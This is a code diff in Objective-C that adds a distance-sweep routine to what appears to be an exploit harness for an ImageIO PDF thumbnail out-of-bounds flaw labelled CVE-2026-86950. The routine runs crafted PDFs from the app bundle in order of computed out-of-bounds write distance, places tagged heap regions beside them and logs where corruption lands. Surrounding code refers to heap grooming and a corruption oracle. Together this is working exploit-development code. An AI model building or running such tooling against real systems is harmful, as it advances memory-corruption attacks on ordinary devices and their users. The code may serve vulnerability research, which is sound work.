@@ -101,6 +101,66 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     return corrupt;
 }
 
+// Sweep the calibrated OOB-distance family (f_dxNN_kMMMM.pdf, one PDF per glyph
+// geometry: distance = 4*(64*dx + K) bytes before the coverage buffer).
+// R86950_START=<index> lets a later run resume where the previous one stopped,
+// so a distance sweep survives the process dying mid-way.
+static int ModSweepDistance(void) {
+    NSString *bundle = [NSBundle mainBundle].bundlePath;
+    NSError *err = nil;
+    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
+                                                                     error:&err];
+    NSMutableArray *fam = [NSMutableArray array];
+    for (NSString *f in all) {
+        if ([f hasPrefix:@"f_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
+    }
+    NSComparator byDist = ^(NSString *a, NSString *b) {
+        // f_dx<NN>_k<MMMM>.pdf — sort by the OOB distance 4*(64*dx + K)
+        int dx1 = [[a substringWithRange:NSMakeRange(5, 2)] intValue];
+        int k1 = [[a substringWithRange:NSMakeRange(9, 4)] intValue];
+        int dx2 = [[b substringWithRange:NSMakeRange(5, 2)] intValue];
+        int k2 = [[b substringWithRange:NSMakeRange(9, 4)] intValue];
+        int64_t d1 = 4 * (64 * dx1 + k1), d2 = 4 * (64 * dx2 + k2);
+        return d1 < d2 ? NSOrderedAscending : (d1 > d2 ? NSOrderedDescending : NSOrderedSame);
+    };
+    [fam sortUsingComparator:byDist];
+    if (!fam.count) {
+        AvePost(@"86950 sweep: no f_dx family in the bundle");
+        return -1;
+    }
+    int start = 0;
+    const char *se = getenv("R86950_START");
+    if (se && *se) start = atoi(se);
+    if (start < 0 || start >= (int)fam.count) start = 0;
+    AvePost([NSString stringWithFormat:@"86950 sweep: %d PDFs (distances %d..%d bytes), "
+             @"starting at index %d", (int)fam.count,
+             4 * (64 * [[fam[0] substringWithRange:NSMakeRange(5, 2)] intValue] +
+                 [[fam[0] substringWithRange:NSMakeRange(9, 4)] intValue]),
+             4 * (64 * [[fam[fam.count - 1] substringWithRange:NSMakeRange(5, 2)] intValue] +
+                 [[fam[fam.count - 1] substringWithRange:NSMakeRange(9, 4)] intValue]),
+             start]);
+
+    for (int i = start; i < (int)fam.count; i++) {
+        NSString *f = fam[i];
+        int dx = [[f substringWithRange:NSMakeRange(5, 2)] intValue];
+        int k = [[f substringWithRange:NSMakeRange(9, 4)] intValue];
+        int dist = 4 * (64 * dx + k);
+        NSString *tag = [NSString stringWithFormat:@"86950-D%d", dist];
+        // a fresh 8MB-tagged region right before, so a write that survives is
+        // still visible: this distance's own canary AND our tag.
+        NSString *r = ModThumbPDF(f, tag, 32);
+        AvePost([NSString stringWithFormat:@"86950D %@ (dx=%d k=%d dist=%d) -> %@",
+                 f, dx, k, dist, r]);
+        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
+            AvePost([NSString stringWithFormat:@"86950 SWEEP STOPPED at distance %d (%@)",
+                     dist, f]);
+            return dist;
+        }
+    }
+    AvePost(@"86950 sweep: every distance rendered without a fault");
+    return 0;
+}
+
 NSString *ModCVE86950(void) {
     AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
     AvePost(@"86950 start");
@@ -125,6 +185,7 @@ NSString *ModCVE86950(void) {
     }
 
     AvePost(@"86950 done: the thumbnail path survived at every raster size");
+    (void)ModSweepDistance();
     // pure-crash sweep is done; now the corruption oracle: with the heap
     // pre-filled with tagged regions, a write that lands inside them changes the
     // tag even if the process survives.
